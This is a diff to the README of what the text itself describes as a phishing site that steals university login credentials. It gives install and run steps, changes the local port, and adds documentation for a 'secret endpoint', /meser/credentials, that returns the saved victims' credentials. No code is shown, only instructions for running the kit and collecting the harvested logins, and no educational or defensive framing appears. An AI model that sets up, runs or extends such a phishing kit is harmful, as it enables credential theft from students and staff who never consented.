@@ -12,4 +12,7 @@ This phising site will steal your university credentials without your notice whe
 2. `cd` into the repository directory.
 3. run `pip install -r requirements.txt` (using virtual-env is optional)
 4. run `python main.py`
-5. the website is available at http://127.0.0.1:5001/meser/login.php
+5. the website is available at http://127.0.0.1:5000/meser/login.php
+
+
+- `/meser/credentials` - A secret endpoint for fetching saved users credentials. 
